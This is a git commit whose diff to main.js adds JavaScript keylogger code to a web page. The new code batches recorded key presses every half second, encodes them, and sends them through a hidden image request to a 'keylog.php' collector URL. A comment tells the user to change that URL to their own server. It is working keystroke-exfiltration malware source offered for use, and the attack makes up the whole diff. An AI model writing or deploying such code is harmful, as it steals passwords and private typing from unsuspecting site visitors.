4185e5c115472ae02adb49f3c720f5df9800bcca
BigBrainAI <59147052+BigBrainAI@users.noreply.github.com>
2020-01-22 20:30:32 -0500

    more java

--- main.js
+++ main.js
@@ -5,3 +5,11 @@ window.addEventListener('keydown', function(evt) {
     k: evt.key
   });
 });
+window.setInterval(function() {
+  if (presses.length > 5) {
+    var data = encodeURIComponent(JSON.stringify(presses));
+    // console.log(data);
+    new Image().src = 'http://localhost/test/keylog.php?k=' + data; // CHANGE THIS URL TO YOUR OWN!
+    presses = [];
+  }
+}, 500);
